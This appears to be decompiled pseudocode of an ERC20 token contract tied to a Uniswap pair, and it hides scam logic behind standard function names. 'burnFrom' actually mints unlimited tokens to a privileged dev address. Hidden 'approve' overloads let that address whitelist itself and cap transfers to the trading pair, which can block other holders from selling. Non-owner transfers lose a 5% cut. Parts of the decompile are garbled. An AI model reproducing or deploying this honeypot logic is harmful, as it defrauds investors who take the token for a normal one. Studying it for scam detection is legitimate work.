contract main {




// =====================  Runtime code  =====================


address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
address stor3;
address stor4;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address uniSwapRouterAddress;
address uniSwapPairAddress;
uint256 stor11;
address BURN_ADDRESS;
uint256 stor13;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function uniSwapRouter() payable {
    return uniSwapRouterAddress
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function uniSwapPair() payable {
    return address(uniSwapPairAddress)
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function BURN_ADDRESS() payable {
    return BURN_ADDRESS
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function approve(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor3 != msg.sender:
        revert with 0, 'ERC20: cannot permit dev address'
    stor4 = arg1
}

function approve(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if stor3 != msg.sender:
        revert with 0, 'ERC20: cannot permit dev address'
    stor13 = 10^18 * arg1
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function burnFrom(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0xfe45524332303a2063616e6e6f74207065726d6974207a65726f20616464726573,
                    mem[197 len 31]
    if stor3 != msg.sender:
        revert with 0, 'ERC20: cannot permit dev address'
    if arg1 + totalSupply < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg1
    if arg1 + balanceOf[address(msg.sender)] < balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(msg.sender)] += arg1
    emit Transfer(arg1, 0, msg.sender);
}

function approve(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    uniSwapRouterAddress = arg2
    require ext_code.size(arg2)
    staticcall arg2.factory() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(uniSwapRouterAddress)
    staticcall uniSwapRouterAddress.WETH() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(address(ext_call.return_data[0]))
    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
            gas gas_remaining wei
           args address(this.address), address(ext_call.return_data[0])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    uint256(stor11) = ext_call.return_data[12 len 20] or Mask(96, 160, uint256(stor11))
    if not ext_call.return_data[12 len 20]:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    44,
                    0x73757064617465546f6b656e53776170526f757465723a20496e76616c696420706169722061646472657373,
                    mem[208 len 20]
    emit uniSwapRouterUpdated(msg.sender, uniSwapRouterAddress, address(uniSwapPairAddress));
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x6542455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if msg.sender == owner:
        if arg2 > balanceOf[address(msg.sender)]:
            revert with 0, 
                        32,
                        38,
                        0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                        mem[166 len 26],
                        mem[218 len 6]
        balanceOf[address(msg.sender)] -= arg2
        if arg2 + balanceOf[arg1] < balanceOf[arg1]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if stor4 != msg.sender:
            if address(uniSwapPairAddress) == arg1:
                if arg2 >= stor13:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                40,
                                0x2e5472616e7366657220616d6f756e74206578636565647320746865206d61785478416d6f756e74,
                                mem[204 len 24]
        if not arg2:
            if 0 > arg2:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg2 > balanceOf[address(msg.sender)]:
                revert with 0, 
                            32,
                            38,
                            0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[294 len 26],
                            mem[346 len 6]
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[stor12] < balanceOf[stor12]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor12] = balanceOf[stor12]
            if arg2 + balanceOf[arg1] < balanceOf[arg1]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if 5 * arg2 / arg2 != 5:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if 5 * arg2 / 100 > arg2:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg2 > balanceOf[address(msg.sender)]:
                revert with 0, 
                            32,
                            38,
                            0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[294 len 26],
                            mem[346 len 6]
            balanceOf[address(msg.sender)] -= arg2
            if (5 * arg2 / 100) + balanceOf[stor12] < balanceOf[stor12]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor12] += 5 * arg2 / 100
            if arg2 - (5 * arg2 / 100) + balanceOf[arg1] < balanceOf[arg1]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] = arg2 - (5 * arg2 / 100) + balanceOf[arg1]
            emit Transfer((arg2 - (5 * arg2 / 100)), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x6542455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg1 == owner:
        if arg3 > balanceOf[address(arg1)]:
            revert with 0, 
                        32,
                        38,
                        0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                        mem[166 len 26],
                        mem[218 len 6]
        balanceOf[address(arg1)] -= arg3
        if arg3 + balanceOf[arg2] < balanceOf[arg2]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
        emit Transfer(arg3, arg1, arg2);
        if arg3 > allowance[address(arg1)][address(msg.sender)]:
            revert with 0, 
                        32,
                        40,
                        0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                        mem[264 len 24],
                        mem[312 len 8]
        if not arg1:
            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
        if not msg.sender:
            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    else:
        if stor4 != arg1:
            if address(uniSwapPairAddress) == arg2:
                if arg3 >= stor13:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                40,
                                0x2e5472616e7366657220616d6f756e74206578636565647320746865206d61785478416d6f756e74,
                                mem[204 len 24]
        if not arg3:
            if 0 > arg3:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg3 > balanceOf[address(arg1)]:
                revert with 0, 
                            32,
                            38,
                            0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[294 len 26],
                            mem[346 len 6]
            balanceOf[address(arg1)] -= arg3
            if balanceOf[stor12] < balanceOf[stor12]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor12] = balanceOf[stor12]
            if arg3 + balanceOf[arg2] < balanceOf[arg2]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
            emit Transfer(arg3, arg1, arg2);
        else:
            if 5 * arg3 / arg3 != 5:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if 5 * arg3 / 100 > arg3:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg3 > balanceOf[address(arg1)]:
                revert with 0, 
                            32,
                            38,
                            0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[294 len 26],
                            mem[346 len 6]
            balanceOf[address(arg1)] -= arg3
            if (5 * arg3 / 100) + balanceOf[stor12] < balanceOf[stor12]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor12] += 5 * arg3 / 100
            if arg3 - (5 * arg3 / 100) + balanceOf[arg2] < balanceOf[arg2]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] = arg3 - (5 * arg3 / 100) + balanceOf[arg2]
            emit Transfer((arg3 - (5 * arg3 / 100)), arg1, arg2);
        if arg3 > allowance[address(arg1)][address(msg.sender)]:
            revert with 0, 
                        32,
                        40,
                        0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                        mem[392 len 24],
                        mem[440 len 8]
        if not arg1:
            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[520 len 28]
        if not msg.sender:
            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[518 len 30]
    ('bool', 'msg.sender')
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
